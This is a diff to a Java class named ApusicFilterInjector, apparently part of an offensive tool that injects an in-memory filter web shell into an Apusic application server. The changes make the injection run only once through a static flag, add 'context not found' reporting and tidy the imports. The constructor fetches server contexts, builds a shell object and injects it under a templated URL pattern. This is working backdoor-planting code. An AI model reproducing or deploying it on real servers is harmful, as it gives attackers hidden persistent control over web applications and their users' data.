@@ -7,7 +7,9 @@ import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -17,6 +19,7 @@ import java.util.zip.GZIPInputStream;
 public class ApusicFilterInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -31,16 +34,21 @@ public class ApusicFilterInjector {
     }
 
     public ApusicFilterInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
-                msg += ("context: [" + getContextRoot(context) + "] ");
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
                     msg += "[" + getUrlPattern() + "] ready\n";
@@ -49,6 +57,7 @@ public class ApusicFilterInjector {
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
